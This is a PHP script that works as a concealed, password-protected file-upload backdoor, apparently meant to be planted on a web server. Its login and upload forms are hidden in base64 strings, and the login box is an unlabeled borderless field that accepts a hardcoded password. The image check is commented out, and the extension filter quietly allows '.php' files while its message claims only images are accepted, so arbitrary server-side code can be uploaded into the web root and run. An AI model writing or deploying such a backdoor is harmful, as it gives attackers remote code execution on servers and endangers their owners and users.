<?php
session_start();


if (isset($_POST['submit'])) {
$target_dir = "";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
// Check if image file is a actual image or fake image
/*
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}

*/
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "php" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}


// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

} ;

$passC = "x47";
$lgn = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxib2R5Pg0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiA+DQoNCiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjpub25lIj4NCg0KPC9mb3JtPg0KDQo8L2JvZHk+DQo8L2h0bWw+" ;
$frm = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxib2R5Pg0KPGEgaHJlZj0nP2E9bG9nb3V0Jz5beF08L2E+DQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCiAgICBTZWxlY3QgZmlsZSB0byB1cGxvYWQ6DQogICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+DQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9Imdhc3NzIiBuYW1lPSJzdWJtaXQiPg0KPC9mb3JtPg0KDQo8L2JvZHk+DQo8L2h0bWw+";
$_SESSION['x47'] = "auhahgeyap";


if(isset($_POST['pass'])) {
	
	$_SESSION['x47'] = $_POST['pass'];
}



if ($_SESSION['x47'] <> $passC ) {
	
echo base64_decode($lgn) ;	
	
	
} else {
	
echo base64_decode($frm) ;	
};


if (isset($_GET['a'])) {
session_destroy() ;	
	
}
?>


